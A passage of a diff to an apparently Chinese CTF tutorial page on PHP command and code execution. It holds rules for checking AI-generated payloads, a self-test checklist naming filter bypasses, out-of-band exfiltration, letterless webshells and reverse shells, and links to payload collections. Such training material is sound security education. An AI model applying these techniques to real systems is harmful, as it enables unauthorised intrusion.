+<a id="__codelineno-26-2" name="__codelineno-26-2"></a><a href="#__codelineno-26-2"><span class="linenos" data-linenos="2 "></span></a>1) 一个 vuln.php（只保留漏洞相关代码）；2) php -S 启动命令；
+<a id="__codelineno-26-3" name="__codelineno-26-3"></a><a href="#__codelineno-26-3"><span class="linenos" data-linenos="3 "></span></a>3) 3 条验证请求（一条正常、两条利用）；4) 用来验证的 flag 文件放哪。
+</code></pre></div>
+<h3 id="112">11.2 三条铁律<a class="headerlink" href="#112" title="Permanent link">&para;</a></h3>
+<div class="admonition danger">
+<p class="admonition-title">铁律</p>
+<ol>
+<li><strong>AI 生成的 payload 默认当作"过时且未验证"</strong>。它的训练数据里大量是 PHP 5/7 时代的 writeup，直接抄到 PHP 8 上必然翻车。</li>
+<li><strong>任何 payload 必须在本地靶场跑通再用于比赛</strong>。搭最小靶场只要 10 行代码（见 <a href="#setup">3.1 方式 B</a>），这是你能给自己加的最高性价比的保险。</li>
+<li><strong>不要用 AI 去打真实目标</strong>。授权范围之外的任何利用都是违法，AI 不会替你承担责任。</li>
+</ol>
+</div>
+<h3 id="113">11.3 建议的学习闭环<a class="headerlink" href="#113" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><span class="filename">Text Only</span><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1"></a><a href="#__codelineno-27-1"><span class="linenos" data-linenos="1 "></span></a>遇到题 → 先自己判断"三层"（编码/语言/shell）
+<a id="__codelineno-27-2" name="__codelineno-27-2"></a><a href="#__codelineno-27-2"><span class="linenos" data-linenos="2 "></span></a>      → 卡住时用 AI 要"思路 + 失败条件"，不要答案
+<a id="__codelineno-27-3" name="__codelineno-27-3"></a><a href="#__codelineno-27-3"><span class="linenos" data-linenos="3 "></span></a>      → 在本地最小靶场复现同类代码，把 payload 跑通
+<a id="__codelineno-27-4" name="__codelineno-27-4"></a><a href="#__codelineno-27-4"><span class="linenos" data-linenos="4 "></span></a>      → 写进自己的博客/速查表（尤其是"我踩了什么坑"）
+<a id="__codelineno-27-5" name="__codelineno-27-5"></a><a href="#__codelineno-27-5"><span class="linenos" data-linenos="5 "></span></a>      → 下次遇到过滤更强的题，从自己的速查表出发
+</code></pre></div>
+<p><strong>要避免的三件事：</strong></p>
+<ul>
+<li>❌ 直接让 AI 给 flag / 给完整 exp，然后复制粘贴交题 —— 你只是完成了提交动作，没有获得能力。</li>
+<li>❌ 只读不敲 —— 命令执行的肌肉记忆来自靶场，不来自阅读。</li>
+<li>❌ 遇到打不通就认为"AI 骗我" —— 多数情况是版本/环境差异，学会用第 10 节的表格自查。</li>
+</ul>
+<h2 id="12">12. 自测清单<a class="headerlink" href="#12" title="Permanent link">&para;</a></h2>
+<p>能独立完成下面这些，说明你已经入门了：</p>
+<ul>
+<li>⬜ 说清<strong>代码执行</strong>和<strong>命令执行</strong>的区别，并各举一个 PHP 函数</li>
+<li>⬜ 不查资料写出 5 种命令分隔符，并说明 <code>||</code> 与 <code>;</code> 的差别</li>
+<li>⬜ 用 <code>php -S</code> + 10 行代码在本地搭出可注入的靶场，并打出 <code>id</code></li>
+<li>⬜ 空格被过滤时，能给出至少 3 种绕过方式（并知道哪种只对 bash 生效）</li>
+<li>⬜ <code>flag</code> 关键词被过滤时，能用通配符与引号拼接读到文件</li>
+<li>⬜ 目标无回显时，能选择写文件 / 时间盲注 / 带外 三条路线中的合适一条</li>
+<li>⬜ 能读懂无参 RCE 的正则含义，并用 <code>scandir</code>+<code>current(localeconv())</code> 列目录</li>
+<li>⬜ 能解释「取反 payload」为什么不含字母数字也能执行命令</li>
+<li>⬜ 目标 PHP 8 时，能说清哪些老技巧会失效、为什么</li>
+<li>⬜ 用 AI 生成的 payload，你有在本地验证的习惯</li>
+</ul>
+<h2 id="13">13. 题单与资料<a class="headerlink" href="#13" title="Permanent link">&para;</a></h2>
+<h3 id="_2">靶场<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<ul>
+<li><a href="https://github.com/ProbiusOfficial/RCE-labs">RCE-labs（ProbiusOfficial）</a> —— 本页主要参考的靶场，28 关覆盖代码执行、命令执行、Bypass、PHP 特性、RCE 来源</li>
+<li><a href="https://hello-ctf.com/hc-web/rce/">Hello-CTF · RCE 章节</a> —— 系统化教材，配套 hc-labs</li>
+<li><a href="https://hello-ctf.com/hc-web/docker_env/">Hello-CTF · Docker 与漏洞环境</a> —— 不会搭环境先看这个</li>
+<li>NSSCTF / 青少年 CTF / CTF+ 搜索标签 <code>RCE-labs</code>（在线环境）</li>
+</ul>
+<h3 id="_3">文章<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<ul>
+<li><a href="https://c1oudfl0w0.github.io/blog/2023/03/15/RCE%E6%80%BB%E7%BB%93/">RCE 总结 Re:Master（c1oudfl0w0）</a> —— 本文另一主要参考，无回显、极限长度、<code>disable_functions</code> 部分尤其全</li>
+<li><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的 webshell（phith0n）</a></li>
+<li><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字 webshell 之提高篇（phith0n）</a></li>
+<li><a href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">我是如何利用环境变量注入执行任意命令（phith0n）</a></li>
+<li><a href="https://probiusofficial.github.io/bashFuck/">bashFuck：Bash 无字母数字命令执行</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection">PayloadsAllTheThings · Command Injection</a></li>
+</ul>
+<h3 id="_4">工具<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>Burp Suite / Yakit</strong>：看原始请求与响应，定位被拦字符（<strong>必备</strong>）</li>
+<li><strong>dnslog / Burp Collaborator</strong>：DNS、HTTP 带外</li>
+<li><strong>CyberChef</strong>：编码、解码、异或、取反一站式（生成绕过 payload 很顺手）</li>
+<li><strong>在线反弹 shell 生成器</strong>：省事用，但要理解原理（见 <a href="#reverse-shell">7.4</a>）</li>
+</ul>
+<div class="admonition quote">
+<p class="admonition-title">最后</p>
+<p>命令执行是 Web 方向里"反馈最直接"的漏洞：你在靶场敲下的每一个符号，系统都会立刻回应你。<strong>把这份直觉练出来</strong>，比背下任何一张 payload 表都值钱。</p>
+<p>顺便说一句：学习路上遇到问题，先自己复现一遍最小环境，再来群里提问——你会发现问题常常在复现的过程中自己就消失了。</p>
 </div>
 
 
@@ -3030,7 +4146,7 @@
     <span class="md-icon" title="最后更新">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="2026年9月10日 15:45:50 UTC">2026年9月10日</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="2026年9月15日 11:12:14 UTC">2026年9月15日</span>
   </span>
 
     
